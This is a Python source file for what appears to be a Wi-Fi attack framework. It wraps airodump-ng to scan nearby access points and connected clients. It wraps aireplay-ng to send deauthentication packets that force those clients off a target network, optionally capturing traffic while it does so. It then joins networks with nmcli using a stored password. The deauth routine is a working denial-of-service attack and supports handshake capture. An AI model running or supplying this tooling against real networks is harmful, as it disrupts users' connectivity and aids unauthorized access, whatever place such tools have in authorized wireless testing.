# -*- coding: UTF-8 -*-
import re
from time import time


__all__ = ["DeauthMixin", "ScanMixin", "WPAConnectMixin", "STATION_REGEX"]

STATION_REGEX = re.compile(r"^\s*(?P<bssid>(?:[0-9A-F]{2}\:){5}[0-9A-F]{2})\s+"
                           r"(?P<station>(?:[0-9A-F]{2}\:){5}[0-9A-F]{2})\s+"
                           r"(?P<power>\-?\d+)\s+")

TARGET_REGEX = re.compile(r"^\s*(?P<bssid>(?:[0-9A-F]{2}\:){5}[0-9A-F]{2})\s+"
                          r"(?P<power>\-?\d+)\s+"
                          r"(?P<beacons>\d+)\s+"
                          r"(?P<data>\d+)\s+"
                          r"(?P<prate>\d+)\s+"
                          r"(?P<channel>\d+)\s+"
                          r"(?P<mb>\w+)\s+"
                          r"(?P<enc>\w+)\s+"
                          r"(?P<cipher>\w+)\s+"
                          r"(?P<auth>\w+)\s+"
                          r"(?P<essid>[\w\-\.]+)\s*$")

CONNECT_REGEX = re.compile(r"(?m)Device '(?P<iface>[a-z][a-z0-9]*)' success"
                           r"fully activated with '(?P<uid>[0-9a-f\-]+)'\.")


class DeauthMixin(object):
    """ Mixin class for adding a .deauth() method """
    def deauth(self, bssid, station=None, n_packets=5, interval=0, timeout=None,
               capture=None, post_func=None):
        t = self.console.state['TARGETS']
        try:
            k = self.config.option('ESSID').value
        except KeyError:
            k = self.config.option('TARGET').value
        ch = t[k]['channel']
        iface = self.console.root.mon_interfaces[0]
        cmd = "sudo airodump-ng -c {}%s --bssid {} {}".format(ch, bssid, iface)
        cmd = cmd % [" -w {}".format(capture), ""][capture is None]
        tr = {}
        # capture packets on the target BSSID
        i = 0
        try:
            for line in self.console._jobs.run_iter(cmd, timeout=timeout):
                self.logger.debug(line)
                m = STATION_REGEX.search(line)
                # deauthenticate any station found
                if m is not None:
                    s = m.group("station")
                    if station is None or station == s:
                        tr.setdefault(s, 0)
                        if interval == 0 or time() - tr[s] > interval:
                            self.logger.warning("Deauth station: {}".format(s))
                            cmd = "sudo aireplay-ng -0 {} -a {} -c {} {}" \
                                  .format(n_packets, bssid, s, iface)
                            self.console._jobs.background(cmd, subpool="deauth")
                            if i % 5 == 0:
                                self.console._jobs.free("deauth")
                            # interval=0 means deauth only once
                            if interval == 0:
                                break
                            i += 1
                            tr[s] = time()
                if post_func:
                    r = post_func(**locals())
                    if r is not None:
                        return r
        finally:
            self.console._jobs.terminate("deauth")


class ScanMixin(object):
    """ Mixin class for use with Command and Module """
    def run(self, interface, timeout=300):
        self.logger.warning("Press Ctrl+C to interrupt")
        s = self.console.state['STATIONS']
        t = self.console.state['TARGETS']
        s.unlock()
        t.unlock()
        cmd = "sudo airodump-ng {}".format(interface)
        try:
            for line in self.console._jobs.run_iter(cmd, timeout=int(timeout)):
                # parse AP-related line for its WiFi information
                m = TARGET_REGEX.search(line)
                if m is not None:
                    # when matching, recreate the data dictionary
                    data = {}
                    for k in ["essid", "bssid", "channel", "power", "enc",
                              "cipher", "auth"]:
                        v = m.group(k)
                        data[k] = int(v) if v.isdigit() else v
                    data['password'] = None
                    data['connected'] = False
                    data['stations'] = []
                    e = data['essid']
                    if self._filter_func(e):
                        if e not in t.keys():
                            self.logger.info("Found {}".format(e))
                        else:
                            # when updating, do not forget to copy previous
                            #  extra information
                            for k in ['password', 'connected', 'stations']:
                                data[k] = t[e].get(k)
                        t[e] = data
                # parse client-related line for its MAC address
                m = STATION_REGEX.search(line)
                if m is not None:
                    e = [tgt for tgt, data in t.items() \
                         if data['bssid'] == m.group("bssid")]
                    if len(e) == 1:
                        e = e[0]
                        sta = m.group("station")
                        if sta not in t[e]['stations']:
                            # first remove from the list of stations for the old
                            #  ESSID
                            if sta in s.keys() and sta in t[s[sta]]['stations']:
                                t[s[sta]]['stations'].remove(sta)
                            # now add the station to the list for the new ESSID
                            t[e]['stations'].append(sta)
                            self.logger.info("Found {} connected to {}"
                                             .format(sta, e))
                        s[sta] = e
        finally:
            s.lock()
            t.lock()


class WPAConnectMixin(object):
    """ Mixin class for use with Command and Module """
    def run(self, essid):
        password = self.console.state['TARGETS'][essid]['password']
        out = self.console._jobs.run(["nmcli", "device", "wifi", "connect",
                                      essid, "password", password])[0]
        self.logger.debug(out)
        m = CONNECT_REGEX.search(out)
        if m is not None:
            self.console._jobs.run(["dhclient", m.group("iface")])
            return True
        return False
